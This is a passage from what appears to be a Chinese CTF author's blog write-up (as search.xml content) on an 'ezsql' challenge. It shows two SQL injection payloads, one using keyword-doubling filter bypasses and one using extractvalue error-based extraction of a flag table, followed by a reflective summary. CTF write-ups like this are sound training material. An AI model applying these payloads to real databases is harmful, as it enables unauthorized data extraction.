flaginit.fflllaaaagggg), 2 &amp;&amp; &#x27;1&#x27; = &#x27;1                                                 #查数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1&#x27; ununionion selselectect extraextractvaluectvalue(1,concat(0x7e,(selselectect group_concat(trueflag)from fflllaaaagggg))),2 &amp;&amp; &#x27;1&#x27; = &#x27;1     #报错</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>之前没什么出题经验，这个<strong>ezsql</strong>本来以为难度不大，但是最后只有一解，让我反思是不是题目有什么刁钻的地方，于是重新分析了一下题目，写了这篇出题思路，从中也有所收获。</p><p>首先当然是要理解基础的知识点，这道题不知道师傅们都卡在了哪一步，不知道上述讲的点是否囊括了所以容易卡住的地方，但是仔细去看这些地方，其实都是我们没有掌握牢固的知识点，所以基础知识很重要。其次就是SQL注入这样的复杂环境应该多去尝试、注入点、注入姿势、等等。</p><p>其实在出题时我也没有去研究这些可能卡主的地方，在结束后反思又学到了一些东西，所以做题的反思也很重要。</p>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
